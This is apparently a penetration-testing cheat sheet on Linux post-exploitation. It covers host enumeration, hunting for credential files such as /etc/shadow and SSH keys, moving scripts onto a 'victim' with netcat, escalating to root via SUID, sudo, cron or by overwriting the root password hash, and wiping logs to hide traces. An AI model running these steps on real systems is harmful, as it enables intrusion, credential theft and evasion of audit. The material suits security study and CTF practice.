# Exploit Linux

<hr class="sl">

## Linux handy commands

<div class="row row-cols-md-2"><div>

Explore the host

* `bash`: start a bash shell
* `cd`: move to another folder
* `ls`: list files in a folder
* `pwd`: path to the current directory
* `cat`: print (usually small) files
* `less`: read (usually big) files
* `chmod`: change permissions
* `chown`: change owner
* `find`: find a file/folder
* `grep/egrep`: find something in a file
* `su`: change user
* `wget`: download something

> You may use python to do things for you, such as starting a web server to browse files <small>(`python3 -m  http.server`)</small>, or run commands <small>(`python -c 'import pty; pty.spawn("/bin/bash")'`)</small>.
</div><div>

Learn more about your environment

* `w`: who is logged in, and what they are doing
* `who`: who is logged in
* `echo $0`: language used by the current shell
* `whoami`: username
* `last`: list of last logged users
* `id`: username, group...
* `uname -a`: info about the machine
* `hostname`: info about the host
* `ps`: see running processes
* `env`: see environment variables
* `umask`: see the default perms on newly created files
* `getent`: shortcut to get entries about something, such as `passwd`
</div></div>

<hr class="sr">

## Linux environment

<div class="row row-cols-md-2 mt-3"><div>

**Look for (sensitive?) information** 🔑

* `/etc/passwd`: usernames, their groups, their home, and their shell
* `/etc/shadow` <small>(root)</small>: username, and their hashed password
* `/etc/group`/`groups`: groups
* `/etc/gshadow` <small>(root)</small>: groups hashed passwords (if any)
* `/proc/version`: information about the machine
* `cat /etc/*release`: information about the operating system
* `/etc/sudoers` <small>(root)</small>: sudoers, and rules applied to them, if any
* `ls -ahl /root/`: see if there are readable files in root's home
* `find / -name *id_dsa* 2> /dev/null`: RSA credentials

**Logs** 🗺️

* `/var/log/` (folder): log files
* Look for ufw (firewall) logs
* Look for apache logs
* Look for fail2ban logs
* Look for backups <small>(such as emails/conversations/database)</small>
* Look for mails `/var/mail/`
* `~/.bash_history`: there may be something useful in the bash_history
</div><div>

**Cron tasks** ⭐

Cron are the name given to automated tasks on Linux. See `crontab -l` for the tasks of the current user, and `ls -la /etc/cron*` for every cron tasks. Then, you may look for vulnerable cron tasks.

<br>

**Potentially vulnerable services** 😢

* Apache: `apache2 -v` / `apache2ctl -M` / `httpd -v`
* Sudo: `sudo -V`
* PostgresSQL: `psql -V`
* MySQL: `mysql --version`

Once you found a service, look for CVE for the given version, and try to use one to escalate to root.

<br>

**Cleaning up your traces** 🧹

* `/var/log/auth.log`: ssh logs
* `/var/log/syslog`: firewall logs
* `/var/log/service`: "service" logs (ex: apache)
* ...

</div></div>

> **NOTE**: don't forget to redirect any errors with `some_command 2> /dev/null`.

<hr class="sl">

## Linux (automated) enumeration

<div class="row row-cols-md-2"><div>

There are many scripts checking if there are "common" files, testing commands... in order to look for information that would be useful for you to reach a higher level of privilege.

* [LinEnum](https://github.com/rebootuser/LinEnum) (5.4k ⭐): a script shell
* [traitor](https://github.com/liamg/traitor)  (5.4k ⭐): a script in Go
* [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) (2.5k ⭐): a script shell
* [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) (1.1k ⭐): a python script
</div><div>

There are multiple ways to get the script on your target

* Open a text editor, copy-paste it
  * run it `bash script.sh`,
  * or use chmod, then `./script.sh`
* Use `wget`
* Use `FTP`
* Use nc/netcat
  * On the victim: `nc -l -p port > script.sh`
  * On the attacker: `nc IP port < script.sh`
</div></div>

<hr class="sr">

## Linux privilege escalation

<div class="row row-cols-md-2"><div>

Privilege escalation refer to a process of obtaining super-administrator (a.k.a. root) privileges, starting from a non-root user.

* [gtfobins](https://gtfobins.github.io/) (7.4k ⭐): a reference to find ways to exploit a command with misconfigured permissions.
</div><div>

* Find a vulnerable service an exploit it <small>(apache, mysql...)</small>
* Find a service in which you can inject data, in order to exploit it
  * Exploit `sudo`
  * Exploit system files
  * Exploit cron jobs
  * Exploit script with the SUID bit
  * ...
* ...
</div></div>

<hr class="sl">

## Misconfigured permissions

<div class="row row-cols-md-2"><div>

If `/etc/shadow` was "intentionally" misconfigured

```bash
$ cat /etc/shadow
# if you can read it: try to bruteforce the password
# if you can write it: change the root password
# (copy a password / generate one mkpasswd -m sha-512 toto)
```

In OLD version of Linux, passwords could be stored in `/etc/passwd`

```bash
$ cat /etc/shadow
- root:x:...
+ root:hashed_password:...
# openssl passwd toto
```
</div><div>

Scripts having the SUID bit can be executed with the permissions of their owner. If you find one, try to see on GTFOBins if you have a well-known way to exploit it.

```bash
$ find / -perm -u=s -type f 2>/dev/null
```
</div></div>

<hr class="sr">

## Exploit sudo

*A good reference to exploit sudo: [SUDO_KILLER](https://github.com/TH3xACE/SUDO_KILLER)* (1.6k ⭐).

<div class="row row-cols-md-2"><div>

Try to find commands that can be run with sudo

```bash
$ sudo -l
# if asking a password, abort
# otherwise, 
# - look for the command on GTFOBins
# - look for environment variable loaded that may be exploited
```
</div><div>

...
</div></div>